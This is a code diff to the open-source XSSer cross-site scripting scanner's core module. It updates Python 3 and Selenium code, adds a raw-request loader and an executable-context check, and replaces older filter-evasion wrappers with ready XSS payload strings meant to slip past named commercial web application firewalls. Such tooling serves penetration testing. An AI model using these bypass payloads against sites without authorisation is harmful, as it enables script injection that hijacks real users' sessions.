@@ -4,7 +4,7 @@
 """
 This file is part of the XSSer project, https://xsser.03c8.net
 
-Copyright (c) 2010/2021 | psy <epsylon@riseup.net>
+Copyright (c) 2010/2026 | psy <epsylon@riseup.net>
 
 xsser is free software; you can redistribute it and/or modify it under
 the terms of the GNU General Public License as published by the Free
@@ -19,16 +19,13 @@ You should have received a copy of the GNU General Public License along
 with xsser; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
-import os, re, sys, datetime, hashlib, time, cgi, traceback, webbrowser, random
+import os, re, sys, datetime, hashlib, time, traceback, webbrowser, random
 
-try:
-    import urllib.request, urllib.error, urllib.parse
-except:
-    print ("\n[Info] XSSer no longer supports Python2: (https://www.python.org/doc/sunset-python-2/). Try to run the tool with Python3.x.y... (ex: python3 xsser)\n")
-    sys.exit()
+import urllib.request, urllib.error, urllib.parse
 
 from random import randint
 from base64 import b64encode, b64decode
+from html import escape as html_escape
 from http.cookies import SimpleCookie
 import core.fuzzing
 import core.fuzzing.vectors
@@ -45,7 +42,6 @@ from core.options import XSSerOptions
 from core.dork import Dorker
 from core.crawler import Crawler
 from core.imagexss import ImageInjections
-from core.flashxss import FlashInjections
 from core.post.xml_exporter import xml_reporting
 from core.tokenhub import HubThread
 from core.reporter import XSSerReporter
@@ -54,6 +50,11 @@ from core.update import Updater
 
 # set to emit debug messages about errors (False = off).
 DEBUG = False
+
+def b64e(data):
+    if isinstance(data, str):
+        data = data.encode("utf-8")
+    return b64encode(data).decode("utf-8")
 
 class xsser(EncoderDecoder, XSSerReporter):
     """
@@ -72,12 +73,13 @@ class xsser(EncoderDecoder, XSSerReporter):
         self.successful_urls = []
         self.urlmalformed = False
         self.search_engines = [] # available dorking search engines
-        self.search_engines.append('bing') # [26/08/2019: OK!]
-        self.search_engines.append('yahoo') # [26/08/2019: OK!]
-        self.search_engines.append('startpage') # [26/08/2019: OK!]
-        self.search_engines.append('duck') # [26/08/2019: OK!]
-        #self.search_engines.append('google')
-        #self.search_engines.append('yandex')
+        self.search_engines.append('bing')
+        self.search_engines.append('duck')
+        self.search_engines.append('brave')
+        self.search_engines.append('mojeek')
+        self.search_engines.append('yahoo')
+        self.search_engines.append('startpage')
+        self.search_engines.append('ecosia')
         self.user_template = None # wizard user template
         self.user_template_conntype = "GET" # GET by default
         self.check_tor_url = 'https://check.torproject.org/' # TOR status checking site
@@ -113,7 +115,10 @@ class xsser(EncoderDecoder, XSSerReporter):
         self.hashed_injections={}
         self.extra_hashed_injections={}
         self.extra_hashed_vector_url = {}
+        self.cookie_set_flag = False # used by DOM/reverse-check headless browser
+        self.driver = None # headless browser (set by --Dom / --reverse-check)
         self.final_hashes = {} # final hashes used by each method
+        self.detection_contexts = {} # executable context detected per hash (reflection oracle)
 
         # some counters for checker systems
         self.errors_isalive = 0
@@ -262,8 +267,70 @@ class xsser(EncoderDecoder, XSSerReporter):
         """
         Set xsser options
         """
+        global DEBUG
         self.options = options
+        if getattr(options, 'reqfile', None):
+            self.load_reqfile(options.reqfile)
+        if getattr(options, 'debug', False):
+            DEBUG = True
+            self.report("\n[Info] [Debug] Debug mode: ON -> tracebacks and internal errors will be shown\n")
         self._opt_request()
+
+    def load_reqfile(self, filename):
+        """
+        Load a raw HTTP request from a file (ex: saved from a proxy-cache).
+        """
+        try:
+            raw = open(filename, encoding="utf-8", errors="replace").read()
+        except:
+            self.report("\n[Error] Cannot read request file: " + str(filename) + "\n")
+            return
+        raw = raw.replace("\r\n", "\n")
+        head, _, body = raw.partition("\n\n")
+        lines = head.split("\n")
+        parts = lines[0].split()
+        if len(parts) < 2:
+            self.report("\n[Error] Invalid HTTP request in file: " + str(filename) + "\n")
+            return
+        method = parts[0].upper()
+        path = parts[1]
+        host = ""
+        cookie = agent = referer = None
+        extra = []
+        skip = ("content-length", "content-type", "accept-encoding", "connection", "accept", "accept-language")
+        for h in lines[1:]:
+            if ":" not in h:
+                continue
+            name, _, val = h.partition(":")
+            name = name.strip(); val = val.strip()
+            low = name.lower()
+            if low == "host":
+                host = val
+            elif low == "cookie":
+                cookie = val
+            elif low == "user-agent":
+                agent = val
+            elif low == "referer":
+                referer = val
+            elif low not in skip:
+                extra.append(name + ": " + val)
+        if not host:
+            self.report("\n[Error] No 'Host' header found in request file\n")
+            return
+        scheme = "http" if (host.startswith("127.0.0.1") or host.startswith("localhost")) else "https"
+        self.options.url = scheme + "://" + host
+        if method == "POST":
+            self.options.postdata = body.strip()
+        else:
+            self.options.getdata = path
+        if cookie:
+            self.options.cookie = cookie
+        if agent:
+            self.options.agent = agent
+        if referer:
+            self.options.referer = referer
+        if extra:
+            self.options.headers = "\n".join(extra)
 
     def _opt_request(self):
         """
@@ -573,6 +640,8 @@ class xsser(EncoderDecoder, XSSerReporter):
         """
         if not self.options.nohead:
             for payload in payloads:
+                if self._landing:
+                    break
                 self.rounds = self.rounds + 1
                 self.attack_url_payload(url, payload, query_string)
         else:
@@ -595,12 +664,16 @@ class xsser(EncoderDecoder, XSSerReporter):
                 self.success_connection = self.success_connection + 1
                 self.report("[Info] HEAD-CHECK: OK! [HTTP-" + hc.info()["http-code"] + "] -> [AIMED]\n")
                 for payload in payloads:
+                    if self._landing:
+                        break
                     self.attack_url_payload(url, payload, query_string)
             else:
                 if str(hc.info()["http-code"]) in ["405"]:
                     self.report("[Info] HEAD-CHECK: NOT ALLOWED! [HTTP-" + hc.info()["http-code"] + "] -> [PASSING]\n")
                     self.success_connection = self.success_connection + 1
                     for payload in payloads:
+                        if self._landing:
+                            break
                         self.attack_url_payload(url, payload, query_string)
                 else:
                     self.not_connection = self.not_connection + 1
@@ -625,10 +698,10 @@ class xsser(EncoderDecoder, XSSerReporter):
         self.report("  - ex (GET+Cookie): xsser -u 'https://target.com' -g '/login.asp?user=bob&password=XSS' --Coo")
         self.report("  - ex (POST+XSR+XSA): xsser -u 'https://target.com/login.asp' -p 'username=bob&password=XSS' --Xsr --Xsa\n")
         self.report("="*75 + "\n")
-        if not self.options.xsser_gtk:
+        if not self.options.xsser_gtk and not self.mothership:
             sys.exit(2)
         else:
-            pass
+            self._landing = True
 
     def get_url_payload(self, url, payload, query_string, user_attack_payload):
         """
@@ -652,8 +725,6 @@ class xsser(EncoderDecoder, XSSerReporter):
 
         if options.agent:
             agent = options.agent
-        else:
-            self.options.agent = agent
         if options.referer:
             referer = options.referer
         else:
@@ -667,57 +738,30 @@ class xsser(EncoderDecoder, XSSerReporter):
         payload_string = payload['payload'].strip()
   
         ### Anti-antiXSS exploits
-        # PHPIDS (>0.6.5) [ALL] -> 32*payload + payload
-        if options.phpids065:
-            payload_string = 32*payload_string + payload_string
-
-        # PHPIDS (>0.7) [ALL] -> payload: 'svg-onload' (23/04/2016)
-        if options.phpids070:
-            payload_string = '<svg+onload=+"'+payload_string+'">'
-
-        # Imperva Incapsula [ALL] -> payload: 'img onerror' + payload[DoubleURL+HTML+Unicode] 18/02/2016 
+        if options.cloudflare:
+            payload_string = '<SVG/OnLoad='+payload_string+'>'
+        if options.akamai:
+            payload_string = '<style>@keyframes x{}</style><b style="animation-name:x" onanimationstart='+payload_string+'>'
+        if options.awswaf:
+            payload_string = '<svg onload='+payload_string+'>'
+        if options.azure:
+            payload_string = '<details/open/ontoggle='+payload_string+'>'
         if options.imperva:
             payload_string = '<img src=x onerror="'+payload_string+'">'
-
-        # WebKnight (>4.1) [Chrome] payload: 'details ontoggle' 18/02/2016 
+        if options.f5bigip:
+            payload_string = '<body/onwheel='+payload_string+'>'
+        if options.barracuda:
+            payload_string = '<body/onload='+payload_string+'>'
+        if options.modsec:
+            payload_string = '<svg/onload='+payload_string+'>'
+        if options.wordfence:
+            payload_string = '<svg><animate onbegin='+payload_string+' attributeName=x dur=1s>'
+        if options.sucuri:
+            payload_string = '<svG/OnLoAd='+payload_string+'>'
+        if options.fortiweb:
+            payload_string = '<img/src=x/onerror='+payload_string+'>'
         if options.webknight:
             payload_string = '<details ontoggle='+payload_string+'>'
-
-        # F5BigIP [Chrome+FF+Opera] payload: 'onwheel' 18/02/2016 
-        if options.f5bigip:
-            payload_string = '<body style="height:1000px" onwheel="'+payload_string+'">'
- 
-        # Barracuda WAF [ALL] payload: 'onwheel' 18/02/2016 
-        if options.barracuda:
-            payload_string = '<body style="height:1000px" onwheel="'+payload_string+'">'
-
-        # Apache / modsec [ALL] payload: special 18/02/2016 
-        if options.modsec:
-            payload_string = '<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover='+payload_string+'>'
-
-        # QuickDefense [Chrome] payload: 'ontoggle' + payload[Unicode] 18/02/2016 
-        if options.quickdefense:
-            payload_string = '<details ontoggle="'+payload_string+'">'
-        
-        # SucuriWAF [ALL] payload: 'ontoggle' + payload[Unicode] 18/02/2016 
-        if options.sucuri:
-           payload_string = '<a+id="a"href=javascript%26colon;alert%26lpar;'+payload_string+'%26rpar;+id="a" style=width:100%25;height:100%25;position:fixed;left:0;top:0 x>Y</a>'
-
-        # Firefox 12 (and below) # 09/2019
-        if options.firefox:
-            payload_string = "<script type ='text/javascript'>"+payload_string+"</script>"
-
-        # Chrome 19 (and below, but also Firefox 12 and below) # 09/2019
-        if options.chrome:
-            payload_string = "<script>/*///*/"+payload_string+"</script>"
-
-        # Internet Explorer 9 (but also Firefox 12 and below) # 09/2019
-        if options.iexplorer:
-            payload_string = 'cooki1%3dvalue1;%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<html><body><script>'+payload_string+'</script></body></html>'
-
-        # Opera 10.6 (but also IE6) # 09/2019
-        if options.opera:
-            payload_string = "<Table background = javascript: alert ("+payload_string+")> </ table>"
 
         # Substitute the attacking hash
         if 'PAYLOAD' in payload_string or 'VECTOR' in payload_string:
@@ -730,12 +774,9 @@ class xsser(EncoderDecoder, XSSerReporter):
         if options.imperva:
             hashed_payload = urllib.parse.urlencode({'':hashed_payload})
             hashed_payload = urllib.parse.urlencode({'':hashed_payload}) #DoubleURL encoding
-            hashed_payload = cgi.escape(hashed_payload) # + HTML encoding
+            hashed_payload = html_escape(hashed_payload) # + HTML encoding
             hashed_payload = str(hashed_payload) # + Unicode
 
-        # Quick Defense
-        if options.quickdefense:
-            hashed_payload = str(hashed_payload) # + Unicode
 
         # apply user final attack url payload
         if user_attack_payload:
@@ -787,7 +828,7 @@ class xsser(EncoderDecoder, XSSerReporter):
                     if "[B64]" in hashed_payload: # [DCP Injection]
                         dcp_payload = hashed_payload.split("[B64]")[1]
                         dcp_preload = hashed_payload.split("[B64]")[0]
-                        dcp_payload = b64encode(dcp_payload)
+                        dcp_payload = b64e(dcp_payload)
                         hashed_payload = dcp_preload + dcp_payload
                     self.hashed_injections[url_orig_hash] = target_url
                     if user_attack_payload:
@@ -812,15 +853,15 @@ class xsser(EncoderDecoder, XSSerReporter):
                         if 'X1S' in dest_url:
                             dest_url = dest_url.replace('X1S', hashed_vector_url)
             else:
-                if 'XSS' in target_url:
-                    url_orig_hash = self.generate_hash('url') # new hash for each parameter with an injection
-                elif 'X1S' in target_url:
+                if 'X1S' in target_url:
                     url_orig_hash = self.generate_numeric_hash() # new hash for each parameter with an injection
+                else:
+                    url_orig_hash = self.generate_hash('url') # new hash for each parameter with an injection
                 hashed_payload = payload_string.replace('XSS', url_orig_hash)
                 if "[B64]" in hashed_payload: # [DCP Injection]
                     dcp_payload = hashed_payload.split("[B64]")[1]
                     dcp_preload = hashed_payload.split("[B64]")[0]
-                    dcp_payload = b64encode(dcp_payload)
+                    dcp_payload = b64e(dcp_payload)
                     hashed_payload = dcp_preload + dcp_payload
                 self.hashed_injections[url_orig_hash] = target_url
                 if user_attack_payload:
@@ -851,7 +892,7 @@ class xsser(EncoderDecoder, XSSerReporter):
                             if "[B64]" in hashed_payload: # [DCP Injection]
                                 dcp_payload = hashed_payload.split("[B64]")[1]
                                 dcp_preload = hashed_payload.split("[B64]")[0]
-                                dcp_payload = b64encode(dcp_payload)
+                                dcp_payload = b64e(dcp_payload)
                                 hashed_payload = dcp_preload + dcp_payload
                             self.hashed_injections[url_orig_hash] = key
                             if user_attack_payload:
@@ -869,7 +910,24 @@ class xsser(EncoderDecoder, XSSerReporter):
                             else:
                                 target_params[key] = v
                 if r == 0 and not self.options.xsa and not self.options.xsr and not self.options.coo and not self.options.crawling:
-                    self.not_keyword_exit()
+                    if target_params:
+                        for key, value in target_params.items():
+                            url_orig_hash = self.generate_hash('url')
+                            hashed_payload = payload_string.replace('XSS', url_orig_hash)
+                            if "[B64]" in hashed_payload:
+                                dcp_payload = hashed_payload.split("[B64]")[1]
+                                dcp_preload = hashed_payload.split("[B64]")[0]
+                                dcp_payload = b64e(dcp_payload)
+                                hashed_payload = dcp_preload + dcp_payload
+                            self.hashed_injections[url_orig_hash] = key
+                            if user_attack_payload:
+                                pass
+                            else:
+                                hashed_vector_url = self.encoding_permutations(hashed_payload)
+                            target_params[key] = hashed_vector_url
+                            r = r + 1
+                    else:
+                        self.not_keyword_exit()
                 payload_url = query_string.strip() + hashed_vector_url
                 target_url_params = urllib.parse.urlencode(target_params)
                 dest_url = p_uri.scheme + "://" + uri + path + "?" + target_url_params
@@ -887,7 +945,7 @@ class xsser(EncoderDecoder, XSSerReporter):
                             if "[B64]" in hashed_payload: # [DCP Injection]
                                 dcp_payload = hashed_payload.split("[B64]")[1]
                                 dcp_preload = hashed_payload.split("[B64]")[0]
-                                dcp_payload = b64encode(dcp_payload)
+                                dcp_payload = b64e(dcp_payload)
                                 hashed_payload = dcp_preload + dcp_payload
                             self.hashed_injections[url_orig_hash] = key
                             if user_attack_payload:
@@ -1040,8 +1098,7 @@ class xsser(EncoderDecoder, XSSerReporter):
             else:
                 self.report("[-] Parameter(s):", query_string, "\n")
         if c.info()["http-code"] in ["200", "302", "301"]:
-            if self.options.statistics:
-                self.success_connection = self.success_connection + 1
+            self.success_connection = self.success_connection + 1
             self._report_attack_success(c, dest_url, payload,
                                         query_string, url)
         else:
@@ -1077,8 +1134,7 @@ class xsser(EncoderDecoder, XSSerReporter):
                 c.get(dest_url)
             # perform check response injection
             if c.info()["http-code"] in ["200", "302", "301"]:
-                if self.options.statistics:
-                    self.success_connection = self.success_connection + 1
+                self.success_connection = self.success_connection + 1
                 self._report_attack_success(c, dest_url, payload,
                                             query_string, url)
             else:
@@ -1092,10 +1148,11 @@ class xsser(EncoderDecoder, XSSerReporter):
         perform encoding permutations on the url and query_string.
         """
         options = self.options
-        if options.Cem: 
+        if options.Cem:
             enc_perm = options.Cem.split(",")
             for _enc in enc_perm:
-                enpayload_url = self.encmap[_enc](enpayload_url)
+                if _enc in self.encmap:
+                    enpayload_url = self.encmap[_enc](enpayload_url)
         else: 
             for enctype in list(self.encmap.keys()):
                 if getattr(options, enctype):
@@ -1135,7 +1192,7 @@ class xsser(EncoderDecoder, XSSerReporter):
                         b64_string = payload["payload"].split("[B64]")
                         b64_string = b64_string[1]
                         b64_string = b64_string.replace('PAYLOAD', key)
-                        b64_string = b64encode(b64_string)
+                        b64_string = b64e(b64_string)
                         b64_string = urllib.parse.urlencode({'':b64_string})
                         if b64_string.startswith("="):
                             b64_string = b64_string.replace("=", "")
@@ -1317,6 +1374,7 @@ class xsser(EncoderDecoder, XSSerReporter):
             self.report("-"*45)
             self.report("\n[+] HTTP Headers Verbose:\n")
             self.report(" [Client Request]")
+            Curl.agent = curl_handle.agent
             Curl.print_options()
             self.report(" [Server Reply]\n")
             self.report(curl_handle.info())
@@ -1431,7 +1489,7 @@ class xsser(EncoderDecoder, XSSerReporter):
                                     b64_string = payload["payload"].split("[B64]")
                                     b64_string = b64_string[1]
                                     b64_string = b64_string.replace('PAYLOAD', key)
-                                    b64_string = b64encode(b64_string)
+                                    b64_string = b64e(b64_string)
                                     b64_string = urllib.parse.urlencode({'':b64_string})
                                     if b64_string.startswith("="):
                                         b64_string = b64_string.replace("=", "")
@@ -1451,7 +1509,7 @@ class xsser(EncoderDecoder, XSSerReporter):
             b64_string = payload["payload"].split("[B64]")
             b64_string = b64_string[1]
             b64_string = b64_string.replace('PAYLOAD', hashing)
-            b64_string = b64encode(b64_string)
+            b64_string = b64e(b64_string)
             if b64_string.startswith("="):
                 b64_string = b64_string.replace("=", "")
             hashing = b64_string
@@ -1459,11 +1517,54 @@ class xsser(EncoderDecoder, XSSerReporter):
             self.check_hash_using_dom(dest_url, payload, hashing, query_string, orig_url, method) # check hash using internal headless browser engine
         else:
             if str(hashing) in c_body and "http-code: 200" in c_info: # [XSS CHECKPOINT: anti-false positives]
-                self.check_false_positives(hashing, c_body, dest_url, payload, query_string, orig_url, method)
+                executable, context = self.verify_executable_reflection(hashing, c_body, payload)
+                if executable:
+                    self.detection_contexts[str(hashing)] = context
+                    self.check_false_positives(hashing, c_body, dest_url, payload, query_string, orig_url, method)
+                else:
+                    self.report("[Info] Hash reflected but " + context + " -> [DISCARDING as false positive!]\n")
+                    self.add_failure(dest_url, payload, hashing, query_string, orig_url, method) # reflected, not executable
             else:
                 self.add_failure(dest_url, payload, hashing, query_string, orig_url, method) # failed!
 
+    def verify_executable_reflection(self, hashing, c_body, payload):
+        try:
+            import re
+            body = str(c_body)
+            hashing = str(hashing)
+            vector = payload.get('payload', '') if isinstance(payload, dict) else str(payload)
+            expected = vector
+            for _kw in ('PAYLOAD', 'X1S', 'XSS'):
+                expected = expected.replace(_kw, hashing)
+            if ('<' in vector or '>' in vector) and expected and expected in body: # payload's own tag/breakout survived UNENCODED -> HTML injection
+                return True, "HTML injection (payload structure reflected unencoded)"
+            for m in re.finditer(re.escape(hashing), body):
+                pos = m.start()
+                pre = body[max(0, pos - 1200):pos]
+                low = pre.lower()
+                if low.rfind('<!--') > low.rfind('-->'): # inside an HTML comment -> inert
+                    continue
+                if low.rfind('<script') > low.rfind('</script>'): # inside <script> -> JS execution (encodings decode here)
+                    return True, "JavaScript context (inside <script>)"
+                lt = pre.rfind('<')
+                gt = pre.rfind('>')
+                if lt == -1 or lt <= gt: # sitting in a text node, not inside an open tag -> inert
+                    continue
+                tag = pre[lt:]
+                if not re.match(r'<\s*[a-zA-Z]', tag): # not a real open tag
+                    continue
+                if re.search(r'\son[a-z]+\s*=\s*(["\'])(?:(?!\1).)*$', tag, re.I): # inside an on*="..." handler value -> JS context (JS-string breakout)
+                    return True, "event-handler JS context (inside on...=)"
+                if re.search(r'(src|href|xlink:href|data|action|formaction)\s*=\s*["\']?\s*(javascript|data)\s*:[^"\'<>]*$', tag, re.I): # javascript:/data: URI value in this raw tag
+                    return True, "URI-scheme context (javascript:/data:)"
+            return False, "reflected but NOT in an executable context (encoded / text-node / inert)"
+        except Exception:
+            return True, "reflected (context check skipped)"
+
     def check_hash_using_dom(self, dest_url, payload, hashing, query_string, orig_url, method):
+        if self.driver is None: # DOM vectors need the headless browser (use --reverse-check or --Dom)
+            self.add_failure(dest_url, payload, hashing, query_string, orig_url, method)
+            return
         if self.cookie_set_flag == False:
             self.generate_headless_cookies(orig_url)
             self.cookie_set_flag = True # cookie has been set!
@@ -1521,7 +1622,11 @@ class xsser(EncoderDecoder, XSSerReporter):
             self.hash_found.append((dest_url, "[hashing check]", method, hashing, query_string, payload, orig_url))
         else:
             payload_sub =  payload['payload']
-            self.report(" [FOUND !!!] -> [ " + hashing + " ] : [ " + method + " ]")
+            detection_context = self.detection_contexts.get(str(hashing))
+            if detection_context:
+                self.report(" [FOUND !!!] -> [ " + hashing + " ] : [ " + method + " ]  (executable: " + detection_context + ")")
+            else:
+                self.report(" [FOUND !!!] -> [ " + hashing + " ] : [ " + method + " ]")
             self.hash_found.append((dest_url, payload['browser'], method, hashing, query_string, payload, orig_url))
         for reporter in self._reporters:
             reporter.add_success(dest_url)
@@ -1544,28 +1649,36 @@ class xsser(EncoderDecoder, XSSerReporter):
         try:
             from selenium import webdriver
             from selenium.webdriver.firefox.options import Options as FirefoxOptions
+            from selenium.webdriver.firefox.service import Service as FirefoxService
             from selenium.common.exceptions import UnexpectedAlertPresentException as UnexpectedAlertPresentException # used for search alert dialogs at DOM
         except:
-            print("\n[Error] Importing: selenium lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-selenium'\n")
-            sys.exit(2)
+            from core._ensure import ensure
+            if ensure('selenium', 'selenium') is None:
+                print("\n[Error] Importing: selenium lib. \n\n To install it on Debian based systems:\n\n $ 'sudo apt-get install python3-selenium'\n")
+                sys.exit(2)
+            from selenium import webdriver
+            from selenium.webdriver.firefox.options import Options as FirefoxOptions
+            from selenium.webdriver.firefox.service import Service as FirefoxService
+            from selenium.common.exceptions import UnexpectedAlertPresentException as UnexpectedAlertPresentException
         try:
             self.dom_browser_alert = UnexpectedAlertPresentException
-            profile = webdriver.FirefoxProfile()
-            profile.set_preference("general.useragent.override", str(agent)) # set Firefox (profile) - random user-agent
-            profile.set_preference('browser.safebrowsing.enabled', True)
-            profile.set_preference('toolkit.telemetry.enabled', False)
-            profile.set_preference('webdriver_accept_untrusted_certs', True)
-            profile.set_preference('security.insecure_field_warning.contextual.enabled', False)
-            profile.set_preference('security.insecure_password.ui.enabled', False)
-            profile.set_preference('extensions.logging.enabled', False)
             options = FirefoxOptions()
+            options.set_preference("general.useragent.override", str(agent)) # set Firefox - random user-agent
+            options.set_preference('browser.safebrowsing.enabled', True)
+            options.set_preference('toolkit.telemetry.enabled', False)
+            options.set_preference('webdriver_accept_untrusted_certs', True)
+            options.set_preference('security.insecure_field_warning.contextual.enabled', False)
+            options.set_preference('security.insecure_password.ui.enabled', False)
+            options.set_preference('extensions.logging.enabled', False)
             options.add_argument("-headless") # set Firefox (options) - headless mode
             options.add_argument("-no-remote")
             options.add_argument("-no-first-run")
             options.add_argument("-app")
             options.add_argument("-safe-mode")
+            options.set_capability("unhandledPromptBehavior", "dismiss")
             current_dir = os.getcwd()
-            driver = webdriver.Firefox(options=options, firefox_profile=profile, executable_path=current_dir+"/core/driver/geckodriver", log_path=os.devnull) # wrapping!
+            service = FirefoxService(executable_path=current_dir+"/core/driver/geckodriver", log_output=os.devnull)
+            driver = webdriver.Firefox(options=options, service=service) # wrapping!
         except:
             driver = None
             self.token_arrived_flag = False
@@ -1737,6 +1850,7 @@ class xsser(EncoderDecoder, XSSerReporter):
 
     def send_token_exploit(self, orig_url, tok_url, hashing, vector_found):
         try:
+            from selenium.webdriver.common.by import By
             if self.cookie_set_flag == False:
                 if not self.options.postdata: # GET
                     self.generate_headless_cookies(tok_url) # send 'tok_url'
@@ -1748,9 +1862,9 @@ class xsser(EncoderDecoder, XSSerReporter):
                 tok_parsed = parse_qs(tok_url)
                 param_found = []
                 for param_parsed in tok_parsed: # find params
-                    param = self.driver.find_element_by_name(param_parsed) # by name
+                    param = self.driver.find_element(By.NAME, param_parsed) # by name
                     if not param:
-                        param = self.driver.find_element_by_id(param_parsed) # by id
+                        param = self.driver.find_element(By.ID, param_parsed) # by id
                     if param:
                         value = str(tok_parsed[param_parsed])
                         if "#http://localhost:19084/success/"+str(hashing) in value: # re-parsing injected params for POST
@@ -1767,10 +1881,16 @@ class xsser(EncoderDecoder, XSSerReporter):
                         if max_length: # bypass max length filters by changing DOM | black magic!
                             self.driver.execute_script("arguments[0].setAttribute('maxlength', arguments[1])", param, '9999999')
                 if len(param_found) == len(tok_parsed): # form fully filled!
-                    login = self.driver.find_element_by_xpath("//*[@type='submit']") # find submit by type
+                    login = self.driver.find_element(By.XPATH, "//*[@type='submit']") # find submit by type
                     login.click() # click it!
             else: # GET
-                self.driver.get(tok_url)
+                try:
+                    self.driver.get(tok_url)
+                except self.dom_browser_alert:
+                    try:
+                        self.driver.switch_to.alert.accept()
+                    except:
+                        pass
             if tok_url not in self.final_attacks: 
                 self.final_attacks[hashing] = {'url': tok_url}
                 self.token_arrived_flag = True
@@ -1812,7 +1932,7 @@ class xsser(EncoderDecoder, XSSerReporter):
                         b64_string = payload["payload"].split("[B64]")
                         b64_string = b64_string[1]
                         b64_string = b64_string.replace('PAYLOAD', key)
-                        b64_string = b64encode(b64_string)
+                        b64_string = b64e(b64_string)
                         b64_string = urllib.parse.urlencode({'':b64_string})
                         if b64_string.startswith("="):
                             b64_string = b64_string.replace("=", "")
@@ -1992,6 +2112,7 @@ class xsser(EncoderDecoder, XSSerReporter):
             self.report("-"*45)
             self.report("\n[+] HTTP Headers Verbose:\n")
             self.report(" [Client Request]")
+            Curl.agent = curl_handle.agent
             Curl.print_options()
             self.report(" [Server Reply]\n")
             self.report(curl_handle.info())
@@ -2160,9 +2281,6 @@ class xsser(EncoderDecoder, XSSerReporter):
         if options.imx:
             self.create_fake_image(options.imx, options.script)
             return []
-        if options.flash:
-            self.create_fake_flash(options.flash, options.script)
-            return []
         if options.update:
             self.report('='*75)
             self.report(str(p.version))
@@ -2223,7 +2341,17 @@ class xsser(EncoderDecoder, XSSerReporter):
                    if self.user_template[4] is not None: # Inject user script
                        self.options.finalpayload = self.user_template[4]
                    else: # not final injection
-                       pass 
+                       pass
+               self.options.fuzz = True # complete analysis
+               if len(self.user_template) > 5 and self.user_template[5] == "reverse-check":
+                   self.options.reversecheck = True
+               if len(self.user_template) > 6:
+                   if self.user_template[6] == "PDF":
+                       self.options.filepdf = "XSSer_report.pdf"
+                   elif self.user_template[6] == "XML":
+                       self.options.filexml = "XSSer_report.xml"
+                   elif self.user_template[6] == "RAW":
+                       self.options.fileoutput = True
            else: # exit
                return
         if options.target: # miau!
@@ -2486,7 +2614,7 @@ class xsser(EncoderDecoder, XSSerReporter):
                 self.report("")
             return self.crawled_urls
 
-        if not options.imx or not options.flash or not options.xsser_gtk or not options.update:
+        if not options.imx or not options.xsser_gtk or not options.update:
             return urls
             
     def run_crawl(self, crawler, url, options):
@@ -2542,9 +2670,9 @@ class xsser(EncoderDecoder, XSSerReporter):
             self.report("-"*25 + "\n")
         self.report("[Info] REQUEST: Cross Site Tracing (XST) Vulnerability...\n")
         if self.options.xst:
-            xst = subprocess.Popen(shlex.split('curl -q -s -i -m 30 -A ' + agent + ' -e ' + referer + ' -X TRACE -N ' + self.options.xst), stdout=subprocess.PIPE)
+            xst = subprocess.Popen(['curl', '-q', '-s', '-i', '-m', '30', '-A', agent, '-e', referer, '-X', 'TRACE', '-N', self.options.xst], stdout=subprocess.PIPE)
         if self.options.target:
-            xst = subprocess.Popen(shlex.split('curl -q -s -i -m 30 -A ' + agent + ' -e ' + referer + ' -X TRACE -N ' + self.options.target), stdout=subprocess.PIPE)
+            xst = subprocess.Popen(['curl', '-q', '-s', '-i', '-m', '30', '-A', agent, '-e', referer, '-X', 'TRACE', '-N', self.options.target], stdout=subprocess.PIPE)
         line1 = xst.stdout.read().decode('utf-8')
         if self.options.verbose:
             if line1 != '':
@@ -2569,7 +2697,11 @@ class xsser(EncoderDecoder, XSSerReporter):
         ans3=True
         ans4=True
         ans5=True
+        ansV=True
+        ansR=True
         ans6=True
+        validate = "normal-check"
+        report = "None"
 
         #step 1: Where
         while ans1:
@@ -2604,6 +2736,8 @@ class xsser(EncoderDecoder, XSSerReporter):
                 ans3=None
                 ans4=None
                 ans5=None
+                ansV=None
+                ansR=None
                 ans6=None
             else:
                 print("\nNot valid choice. Try again!")
@@ -2618,7 +2752,9 @@ class xsser(EncoderDecoder, XSSerReporter):
             *[4]- I don't know how to connect... Just do it! :-)
              [e]- Exit/Quit/Abort.
             """)
-            ans2 = input("Your choice: [1], [2], [3], [4] or [e]xit\n")
+            ans2 = input("Your choice: [1], [2], [3], [4] or [e]xit (or [ENTER] for default)\n")
+            if ans2 == "":
+                ans2 = "4"
             if ans2 == "1": # using GET
                 payload = input("GET payload (ex: '/menu.php?q='): ")
                 if payload == None:
@@ -2647,6 +2783,8 @@ class xsser(EncoderDecoder, XSSerReporter):
                 ans3=None
                 ans4=None
                 ans5=None
+                ansV=None
+                ansR=None
                 ans6=None
             else:
                 print("\nNot valid choice. Try again!")
@@ -2661,7 +2799,9 @@ class xsser(EncoderDecoder, XSSerReporter):
              [4]- No. It's not a problem for me to connect directly to the target(s).
              [e]- Exit/Quit.
             """)
-            ans3 = input("Your choice: [1], [2], [3], [4] or [e]xit\n")
+            ans3 = input("Your choice: [1], [2], [3], [4] or [e]xit (or [ENTER] for default)\n")
+            if ans3 == "":
+                ans3 = "3"
             if ans3 == "1": # using PROXY + spoofing
                 proxy = input("Enter proxy [http(s)://server:port]: ")
                 ans3 = None
@@ -2680,6 +2820,8 @@ class xsser(EncoderDecoder, XSSerReporter):
                 ans3=None
                 ans4=None
                 ans5=None
+                ansV=None
+                ansR=None
                 ans6=None
             else:
                 print("\nNot valid choice. Try again!")
@@ -2695,7 +2837,9 @@ class xsser(EncoderDecoder, XSSerReporter):
             *[5]- I don't know exactly what is a 'bypasser'... But I want to inject code! :-)
              [e]- Exit/Quit.
             """)
-            ans4 = input("Your choice: [1], [2], [3], [4], [5] or [e]xit\n")
+            ans4 = input("Your choice: [1], [2], [3], [4], [5] or [e]xit (or [ENTER] for default)\n")
+            if ans4 == "":
+                ans4 = "5"
             if ans4 == "1": # no encode
                 enc = "Not using encoders"
                 ans4 = None
@@ -2715,6 +2859,8 @@ class xsser(EncoderDecoder, XSSerReporter):
                 print("Closing wizard...")
                 ans4=None
                 ans5=None
+                ansV=None
+                ansR=None
                 ans6=None
             else:
                 print("\nNot valid choice. Try again!")
@@ -2728,7 +2874,9 @@ class xsser(EncoderDecoder, XSSerReporter):
             *[3]- I don't want to inject a final code... I just want to discover vulnerabilities! :-)
              [e]- Exit/Quit.
             """)
-            ans5 = input("Your choice: [1], [2], [3] or [e]xit\n")
+            ans5 = input("Your choice: [1], [2], [3] or [e]xit (or [ENTER] for default)\n")
+            if ans5 == "":
+                ans5 = "3"
             if ans5 == "1": # alertbox
                 script = 'Alertbox'
